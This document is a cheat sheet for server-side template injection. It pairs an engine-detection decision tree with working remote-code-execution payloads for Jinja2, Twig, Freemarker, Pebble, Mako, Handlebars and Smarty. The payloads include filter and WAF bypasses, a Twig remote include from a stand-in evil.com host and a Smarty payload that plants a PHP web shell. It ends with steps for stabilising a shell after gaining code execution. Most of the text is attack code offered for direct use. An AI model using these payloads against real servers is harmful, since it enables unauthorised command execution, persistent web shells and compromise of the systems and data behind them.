# SSTI Engine Detection & Exploitation Reference

## Detection Decision Tree

```
Inject: {{7*7}}
├── Returns 49?
│   ├── Inject: {{7*'7'}}
│   │   ├── Returns 49   → Twig (PHP)
│   │   └── Returns 7777777 → Jinja2 (Python) ← Most common
│   └── No? try: ${7*7}
│       └── Returns 49?  → Freemarker or Velocity (Java)
├── Returns {{7*7}} (literal)?
│   └── Not a template engine (or escaped)
└── Error containing template keywords?
    └── Analyze error message for engine name
```

## Jinja2 Full Exploitation

```python
# Basic
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}

# Via request object
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}

# Via cycler (bypass some WAFs)
{{cycler.__init__.__globals__.os.popen('id').read()}}

# Via joiner
{{joiner.__init__.__globals__.os.popen('id').read()}}

# No-underscore bypass
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}

# No dots/underscores (space filter bypass)
{%set%20a=(()|select|string|list)[24]%}{%set%20b=(a,a,'globals',a,a)|join%}
```

## Twig (PHP) Exploitation

```php
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{['id']|filter('system')}}
{{app.request.server.get('HTTP_HOST')}}    # info leak
{%set html%}{%include "http://evil.com/evil.twig"%}{%endset%}   # RFI
```

## Freemarker (Java) Exploitation

```
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
[#assign ex = 'freemarker.template.utility.Execute'?new()]${ex("id")}
${"freemarker.template.utility.Execute"?new()("id")}
```

## Pebble (Java) Exploitation

```
{%set cmd="id"%}{%set bytes=cmd.getBytes()%}
{{someString.toUpperCase()}}   # detection
{% for i in range(3) %}        # control flow confirms Pebble
```

## Mako (Python) Exploitation

```
${__import__('os').popen('id').read()}
<%
import os
x=os.popen('id').read()
%>
${x}
```

## Handlebars (Node.js) Exploitation

```
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').execSync('id').toString();"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

## Smarty (PHP) Exploitation

```
{php}echo `id`;{/php}
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
```

## Shell Stabilization After RCE

```bash
# Python TTY
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Upgrade shell
Ctrl+Z
stty raw -echo
fg
# Press Enter twice
export TERM=xterm

# Check for useful binaries
which curl wget nc python3 python perl ruby php
```
